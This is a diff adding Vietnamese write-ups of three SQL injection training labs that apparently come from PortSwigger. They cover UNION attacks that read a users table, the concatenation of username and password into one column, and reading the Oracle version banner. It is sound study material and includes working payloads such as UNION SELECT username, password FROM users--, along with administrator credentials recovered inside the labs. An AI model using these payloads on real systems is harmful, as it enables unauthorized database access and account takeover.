@@ -186,3 +186,230 @@ Thay chuỗi thử nghiệm bằng giá trị ngẫu nhiên bài yêu cầu (ví
 Trang thông báo __“Congratulations, you solved the lab!”__, hoàn tất mục tiêu đưa giá trị bài cho vào kết quả truy vấn.
  
 ---
+
+## LAB 5: SQL injection UNION attack to retrieve data from other tables
+
+__Tấn công SQL injection UNION để truy xuất dữ liệu từ các bảng khác__
+
+![2025-11-06-20-31-06](../images/2025-11-06-20-31-06.png)
+---
+ 
+Lab giới thiệu mục tiêu:\
+Dùng `SQL injection UNION` để đọc bảng `users` (`username`, `password`) rồi đăng nhập tài khoản `administrator`.
+ 
+---
+![2025-11-06-20-32-49](../images/2025-11-06-20-32-49.png)
+---
+ 
+Request gốc `GET /filter?category=Corporate+gifts` trả `200 OK`\
+Làm đường baseline trước khi thử payload.
+ 
+---
+![2025-11-06-20-33-29](../images/2025-11-06-20-33-29.png)
+---
+
+Thêm dấu `'` vào tham số gây `500 Internal Server Error`, xác nhận điểm tiêm và lỗi cú pháp SQL.
+
+---
+![2025-11-06-20-33-54](../images/2025-11-06-20-33-54.png)
+---
+
+Payload `Corporate+gifts'-- -` dùng comment để khôi phục truy vấn, phản hồi `200`, sẵn sàng bước đếm cột
+
+---
+![2025-11-06-20-34-25](../images/2025-11-06-20-34-25.png)
+---
+
+Không dùng được `ORDER BY` 
+
+---
+![2025-11-06-20-37-58](../images/2025-11-06-20-37-58.png)
+---
+ 
+Thử UNION SELECT NULL thất bại (500), nhắc cần khớp đúng số cột
+ 
+---
+![2025-11-06-20-40-50](../images/2025-11-06-20-40-50.png)
+---
+
+Intruder chạy danh sách `NULL, NULL,NULL, NULL,NULL,NULL…`;\
+Chỉ payload `NULL,NULL` trả `200`, khẳng định truy vấn gốc có 2 cột
+
+---
+![2025-11-06-20-44-08](../images/2025-11-06-20-44-08.png)
+---
+ 
+Dùng `UNION SELECT username, password FROM users--` hiển thị cặp tài khoản đầu tiên `wiener / jh7uflgimyxh4uts7jv9`, chứng tỏ có thể đọc bảng `users`
+ 
+---
+![2025-11-06-20-50-07](../images/2025-11-06-20-50-07.png)
+Thêm điều kiện `WHERE username='administrator'` để lọc đúng tài khoản quản trị; phản hồi chứa `administrator / vo0asiqrq5762wjeeixq`
+![2025-11-06-20-50-45](../images/2025-11-06-20-50-45.png)
+
+---
+
+Sau khi dùng thông tin trên để đăng nhập, trang “My Account” xác nhận đăng nhập thành công với username `administrator`, đồng thời lab được đánh dấu solved.
+
+---
+## LAB 6: SQL injection UNION attack, retrieving multiple values in a single column
+
+__Tấn công SQL injection UNION, truy xuất nhiều giá trị trong một cột__
+
+![2025-11-06-20-56-12](../images/2025-11-06-20-56-12.png)
+---
+ 
+Request gốc `GET /filter?category=Pets` trả `200 OK`, đặt baseline cho lab “retrieving multiple values in a single column”.
+ 
+---
+![2025-11-06-20-56-28](../images/2025-11-06-20-56-28.png)
+---
+ 
+Chỉ thêm dấu `'` khiến phản hồi `500`, xác nhận có lỗ hổng `SQLi`.
+ 
+---
+![2025-11-06-20-56-45](../images/2025-11-06-20-56-45.png)
+---
+ 
+Dùng payload `Pets'--` để comment phần còn lại của truy vấn và khôi phục phản hồi `200`
+ 
+---
+![2025-11-06-20-59-54](../images/2025-11-06-20-59-54.png)
+---
+ 
+Thử `UNION SELECT NULL--` gây lỗi `500`, cho thấy số cột không khớp và cần xác định chính xác.
+ 
+---
+![2025-11-06-21-00-41](../images/2025-11-06-21-00-41.png)
+---
+
+Intruder thử chuỗi `NULL, NULL,NULL, NULL,NULL,NULL…`; chỉ `NULL,NULL` trả `200`, chứng minh truy vấn gốc có `2` cột.
+
+---
+![2025-11-06-21-01-29](../images/2025-11-06-21-01-29.png)
+---
+ 
+
+ 
+---
+![2025-11-06-21-01-47](../images/2025-11-06-21-01-47.png)
+
+---
+
+Test cột nào nhận chuỗi; payload `UNION SELECT 'a', NULL--` lỗi, trong khi `UNION SELECT NULL, 'a'--` trả `200`, nên cột thứ hai là kiểu chuỗi.
+
+---
+![2025-11-06-21-06-36](../images/2025-11-06-21-06-36.png)
+---
+
+Xây dựng payload `UNION SELECT NULL, username || '~~' || password FROM users WHERE username='administrator'--`. Phần `||` ghép username và password vào cùng cột, hiển thị `administrator~~xkzdcjb297erzm54`.
+ 
+---
+![2025-11-06-21-07-39](../images/2025-11-06-21-07-39.png)
+---
+
+Dùng thông tin vừa lấy để đăng nhập; trang “My Account” xác nhận tài khoản `administrator` và lab được đánh dấu solved.
+
+---
+
+## LAB 7: SQL injection attack, querying the database type and version on Oracle
+
+__Tấn công SQL injection, truy vấn loại và phiên bản cơ sở dữ liệu trên Oracle__
+
+![2025-11-06-21-20-55](../images/2025-11-06-21-20-55.png)
+
+---
+ 
+Lab yêu cầu dùng `SQL injection` trên `Oracle` để hiển thị chuỗi `version` của DB
+ 
+---
+![2025-11-06-21-23-42](../images/2025-11-06-21-23-42.png)
+
+---
+ 
+Request hợp lệ `category=Gifts` trả `200`, dùng làm baseline.
+ 
+---
+![2025-11-06-21-24-21](../images/2025-11-06-21-24-21.png)
+
+---
+ 
+Thêm dấu `'` → `500 Internal Server Error`, chứng tỏ có lỗ hổng `SQLi`.
+ 
+---
+![2025-11-06-21-24-44](../images/2025-11-06-21-24-44.png)
+
+---
+
+Comment payload `Gifts'--` khôi phục `200`, sẵn sàng thử `UNION`.
+
+---
+![2025-11-06-21-27-33](../images/2025-11-06-21-27-33.png)
+
+---
+ 
+`UNION SELECT NULL--` lỗi `500`; cần xác định số cột chính xác và cú pháp cho `Oracle`.
+ 
+---
+![2025-11-06-21-37-55](../images/2025-11-06-21-37-55.png)
+
+---
+ 
+Intruder với nhiều `NULL` vẫn `500`; chưa có payload nào thành công.
+ 
+---
+![2025-11-06-21-38-08](../images/2025-11-06-21-38-08.png)
+
+---
+ 
+Gợi ý của lab nhắc `Oracle` yêu cầu `SELECT ... FROM ...` (dùng bảng `dual`)
+ 
+---
+![2025-11-06-21-38-57](../images/2025-11-06-21-38-57.png)
+
+---
+
+Intruder mới với dạng `NULL, NULL FROM dual` cho thấy chỉ payload có 2 cột `NULL` trả `200`, xác nhận truy vấn gốc có 2 cột
+
+---
+![2025-11-06-21-44-19](../images/2025-11-06-21-44-19.png)
+
+---
+ 
+Thử `UNION SELECT 'a', NULL FROM dual--` trả `200`; tức cột đầu chấp nhận chuỗi, cột sau vẫn `NULL`.
+ 
+---
+![2025-11-06-21-50-31](../images/2025-11-06-21-50-31.png)
+
+---
+
+Payload `UNION SELECT (SELECT * FROM v$version), NULL FROM dual--` lỗi `500` vì subquery trả nhiều dòng/column
+
+---
+![2025-11-06-21-50-51](../images/2025-11-06-21-50-51.png)
+
+---
+ 
+Điều chỉnh thành `UNION SELECT (SELECT banner FROM v$version WHERE ROWNUM=1), NULL FROM dual--` để lấy dòng đầu tiên; trang hiển thị banner DB "Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production"
+ 
+---
+![2025-11-06-22-02-17](../images/2025-11-06-22-02-17.png)
+
+---
+
+Rút gọn payload cuối cùng `UNION select banner, NULL from v$version--`, vẫn trả `200`
+
+---
+![2025-11-06-22-03-10](../images/2025-11-06-22-03-10.png)
+
+---
+ 
+Giao diện người dùng hiển thị chuỗi phiên bản `Oracle` ngay trong danh sách sản phẩm, xác nhận khai thác thành công.
+ 
+---
+![2025-11-06-22-03-26](../images/2025-11-06-22-03-26.png)
+
+---
+
+Banner “Solved” xuất hiện, lab hoàn thành với payload `Tech gifts' UNION select banner, NULL from v$version--`
+
+---
